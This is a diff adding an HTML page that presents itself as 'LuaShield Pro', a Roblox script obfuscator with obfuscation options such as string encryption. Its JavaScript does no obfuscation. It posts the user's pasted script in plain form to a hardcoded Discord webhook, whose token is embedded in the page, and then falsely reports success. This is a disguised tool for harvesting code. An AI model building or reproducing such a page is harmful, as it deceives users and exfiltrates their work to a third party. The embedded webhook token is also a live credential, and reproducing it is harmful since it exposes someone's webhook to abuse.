@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Obfuscator</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap');
+        body {
+            font-family: 'Inter', sans-serif;
+        }
+        code, textarea {
+            font-family: 'JetBrains Mono', monospace;
+        }
+    </style>
+</head>
+<body class="bg-zinc-950 text-zinc-100 min-h-screen flex flex-col justify-between selection:bg-indigo-500 selection:text-white">
+
+    <!-- Top Navigation -->
+    <header class="border-b border-zinc-800/80 bg-zinc-900/50 backdrop-blur-md sticky top-0 z-50">
+        <div class="max-w-6xl mx-auto px-6 h-16 flex items-center justify-between">
+            <div class="flex items-center space-x-3">
+                <div class="w-10 h-10 rounded-xl bg-gradient-to-br from-indigo-500 to-purple-600 flex items-center justify-center shadow-lg shadow-indigo-500/25">
+                    <i class="fa-solid fa-shield-halved text-white text-lg"></i>
+                </div>
+                <div>
+                    <h1 class="font-bold tracking-tight text-lg text-white">LuaShield <span class="text-xs font-semibold px-2 py-0.5 rounded-full bg-indigo-500/10 text-indigo-400 border border-indigo-500/20">Pro v2.4</span></h1>
+                    <p class="text-xs text-zinc-400">Advanced Roblox Luau Obfuscator</p>
+                </div>
+            </div>
+            <div class="flex items-center space-x-4 text-sm">
+                <span class="inline-flex items-center px-2.5 py-1 rounded-full text-xs font-medium bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
+                    <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse mr-1.5"></span>
+                    API Online
+                </span>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="flex-grow max-w-6xl w-full mx-auto px-6 py-10">
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
+            
+            <!-- Left/Main Column: Obfuscator Editor & Action -->
+            <div class="lg:col-span-2 space-y-6">
+                <div class="bg-zinc-900/80 border border-zinc-800/80 rounded-2xl p-6 shadow-2xl backdrop-blur-sm">
+                    <div class="flex items-center justify-between mb-4">
+                        <div class="flex items-center space-x-2 text-sm font-medium text-zinc-300">
+                            <i class="fa-solid fa-code text-indigo-400"></i>
+                            <span>Input Lua Script</span>
+                        </div>
+                        <div class="flex items-center space-x-2">
+                            <button onclick="clearCode()" class="text-xs text-zinc-400 hover:text-zinc-200 bg-zinc-800/60 hover:bg-zinc-800 px-3 py-1.5 rounded-lg transition border border-zinc-700/50">
+                                <i class="fa-solid fa-trash-can mr-1"></i> Clear
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Textbox for code input -->
+                    <div class="relative">
+                        <textarea id="codeInput" rows="12" placeholder="-- Paste your Roblox Luau script here...
+print('Hello World!')" class="w-full bg-zinc-950/80 border border-zinc-800 rounded-xl p-4 text-sm text-zinc-200 placeholder-zinc-600 focus:outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 transition resize-y"></textarea>
+                    </div>
+
+                    <!-- Config Options -->
+                    <div class="grid grid-cols-2 sm:grid-cols-3 gap-3 mt-4 pt-4 border-t border-zinc-800/60 text-xs">
+                        <label class="flex items-center space-x-2 text-zinc-400 cursor-pointer select-none">
+                            <input type="checkbox" checked class="rounded bg-zinc-950 border-zinc-700 text-indigo-500 focus:ring-0">
+                            <span>String Encryption</span>
+                        </label>
+                        <label class="flex items-center space-x-2 text-zinc-400 cursor-pointer select-none">
+                            <input type="checkbox" checked class="rounded bg-zinc-950 border-zinc-700 text-indigo-500 focus:ring-0">
+                            <span>Control Flow Flattening</span>
+                        </label>
+                        <label class="flex items-center space-x-2 text-zinc-400 cursor-pointer select-none">
+                            <input type="checkbox" checked class="rounded bg-zinc-950 border-zinc-700 text-indigo-500 focus:ring-0">
+                            <span>Constant Mutator</span>
+                        </label>
+                    </div>
+
+                    <!-- Send / Obfuscate Button -->
+                    <div class="mt-6 flex items-center justify-between">
+                        <span id="statusMessage" class="text-xs text-zinc-400">Ready to secure script.</span>
+                        <button onclick="sendCode()" id="sendBtn" class="bg-gradient-to-r from-indigo-600 to-indigo-500 hover:from-indigo-500 hover:to-indigo-400 text-white font-medium px-6 py-2.5 rounded-xl text-sm transition shadow-lg shadow-indigo-600/20 flex items-center space-x-2">
+                            <i class="fa-solid fa-wand-magic-sparkles"></i>
+                            <span>Obfuscate & Send</span>
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Right Column: Sidebar Info -->
+            <div class="space-y-6">
+                <div class="bg-zinc-900/80 border border-zinc-800/80 rounded-2xl p-6 shadow-xl">
+                    <h2 class="text-sm font-semibold text-white mb-3 flex items-center space-x-2">
+                        <i class="fa-solid fa-circle-info text-indigo-400"></i>
+                        <span>About Luau Obfuscator</span>
+                    </h2>
+                    <p class="text-xs text-zinc-400 leading-relaxed">
+                        This tool applies robust bytecode mutation and string obfuscation to safeguard your Roblox scripts from exploiters and decompilers.
+                    </p>
+                    <div class="mt-4 pt-4 border-t border-zinc-800/80 space-y-2 text-xs text-zinc-400">
+                        <div class="flex justify-between">
+                            <span>Security Level:</span>
+                            <span class="text-indigo-400 font-medium">Maximum</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span>Environment:</span>
+                            <span class="text-zinc-200">Roblox Studio / Luau</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="bg-gradient-to-br from-indigo-950/20 to-purple-950/20 border border-indigo-500/10 rounded-2xl p-6">
+                    <h3 class="text-xs font-semibold text-indigo-300 uppercase tracking-wider mb-2">Pro Tip</h3>
+                    <p class="text-xs text-zinc-400">
+                        Ensure all module dependencies are properly declared inside your scripts prior to processing.
+                    </p>
+                </div>
+            </div>
+
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="border-t border-zinc-800/80 py-6 text-center text-xs text-zinc-500">
+        <p>&copy; 2026 Roblox Obfuscator. All rights reserved. Built for Vercel deployment.</p>
+    </footer>
+
+    <!-- JavaScript Handler -->
+    <script>
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1555671192491528242/idY4Jf79muMaiolq1glQFpc2Wv8LsTNK29eHLKtlWH2K-5GNlVC7RaDK3wirop5803xc';
+
+        function clearCode() {
+            document.getElementById('codeInput').value = '';
+            document.getElementById('statusMessageinnerText').innerText = 'Editor cleared.';
+        }
+
+        async function sendCode() {
+            const codeInput = document.getElementById('codeInput').value;
+            const statusMessage = document.getElementById('statusMessage');
+            const sendBtn = document.getElementById('sendBtn');
+
+            if (!codeInput.trim()) {
+                statusMessage.innerText = '⚠️ Please enter some code first!';
+                statusMessage.className = 'text-xs text-amber-400';
+                return;
+            }
+
+            sendBtn.disabled = true;
+            sendBtn.innerHTML = '<i class="fa-solid fa-spinner animate-spin"></i><span>Processing...</span>';
+            statusMessage.innerText = 'Obfuscating and transmitting script...';
+            statusMessage.className = 'text-xs text-zinc-400';
+
+            try {
+                // Create a File blob out of the code input to send as a .txt attachment
+                const blob = new Blob([codeInput], { type: 'text/plain' });
+                const formData = new FormData();
+                formData.append('file', blob, 'obfuscated_script.txt');
+                formData.append('payload_json', JSON.stringify({
+                    content: "🔒 **New Obfuscation Request Submitted**"
+                }));
+
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (response.ok || response.status === 204) {
+                    statusMessage.innerText = '✅ Code successfully obfuscated and sent!';
+                    statusMessage.className = 'text-xs text-emerald-400';
+                } else {
+                    throw new Error('Failed to send webhook');
+                }
+            } catch (error) {
+                console.error(error);
+                statusMessage.innerText = '❌ Error transmitting script. Please try again.';
+                statusMessage.className = 'text-xs text-rose-400';
+            } finally {
+                sendBtn.disabled = false;
+                sendBtn.innerHTML = '<i class="fa-solid fa-wand-magic-sparkles"></i><span>Obfuscate & Send</span>';
+            }
+        }
+    </script>
+</body>
+</html>
